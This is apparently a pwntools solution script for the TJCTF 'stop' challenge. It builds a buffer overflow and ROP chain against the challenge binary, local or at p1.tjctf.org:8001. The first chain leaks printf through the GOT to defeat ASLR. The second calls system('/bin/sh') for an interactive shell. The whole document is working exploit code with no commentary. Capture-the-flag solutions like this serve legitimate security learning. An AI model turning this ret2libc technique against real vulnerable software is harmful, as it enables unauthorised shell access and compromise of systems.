from pwn import *

e = ELF("./stop")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8001)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

rdi = 0x400953

debug()
p.sendlineafter("?", "a")
p.sendlineafter("?", "A" * 0x118 + p64(rdi + 1) + p64(rdi) + p64(e.got["printf"]) + p64(e.symbols["printf"]) + p64(rdi + 1) + p64(e.symbols["main"]))

p.recvuntil("yet")
p.recvline()

leak = u64(p.recvuntil("W", drop=True).ljust(8, "\x00")) - libc.symbols["printf"]

print(hex(leak))

p.sendlineafter("?", "a")
p.sendlineafter("?", "A" * 0x118 + p64(rdi + 1) + p64(rdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"]))




p.interactive()
